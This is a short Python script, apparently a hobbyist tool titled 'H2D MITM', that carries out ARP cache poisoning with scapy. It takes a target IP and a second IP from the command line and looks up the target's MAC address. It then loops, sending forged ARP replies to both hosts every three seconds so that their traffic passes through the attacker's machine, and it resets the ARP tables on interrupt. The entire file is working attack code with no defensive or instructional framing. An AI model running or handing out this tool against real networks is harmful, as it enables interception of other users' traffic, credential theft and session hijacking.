import scapy.all as scapy
import optparse
import time

banner = """
==================================
            H2D MITM
==================================
"""
def inputs():
    opt = optparse.OptionParser()
    opt.add_option("-t","--target",help="enter destination ip address",dest="targetIp")
    opt.add_option("-p","--poisoned",help="enter the ip address to poison",dest="poisonedIp")
    option = opt.parse_args()[0]
    if not option.targetIp:
        print("enter destination ip address")
    if not option.poisonedIp:
        print("enter the ip address to poison")
    return option

def scan(ip):
    arpRequest = scapy.ARP(pdst=ip)
    #scayp.ls(scayp.ARP())
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scayp.ls(scayp.Ether())
    combinedPacket = broadcastPacket/arpRequest
    answeredList = scapy.srp(combinedPacket,timeout=1,verbose=False)[0]
    return answeredList[0][1].hwsrc

def arpPoisoning(targetIp,poisonedIp):
    targetMac = scan(targetIp)
    arpResponse = scapy.ARP(op=2,pdst=targetIp,hwdst=targetMac,psrc=poisonedIp)
    scapy.send(arpResponse,verbose=False)

def arpReset(fooledIp,poisonedIp):
    fooledMac = scan(fooledIp)
    poisenedMac = scan(poisonedIp)
    arpResponse = scapy.ARP(op=2,pdst=fooledIp,hwdst=fooledMac,psrc=poisonedIp,hwsrc=poisenedMac)
    scapy.send(arpResponse,verbose=False,count=6)

print(banner)
number = 2
userIp = inputs()
uTargetIp = userIp.targetIp
uPoisonedIp = userIp.poisonedIp
scan(uTargetIp)

try :
    while True:
        arpPoisoning(uTargetIp,uPoisonedIp)
        arpPoisoning(uPoisonedIp,uTargetIp)
        print("\rsending packets! {}".format(number),end="")
        number += 2
        time.sleep(3)
except KeyboardInterrupt:
    arpReset(uTargetIp,uPoisonedIp)
    arpReset(uPoisonedIp, uTargetIp)
    print("\nQuit & reset")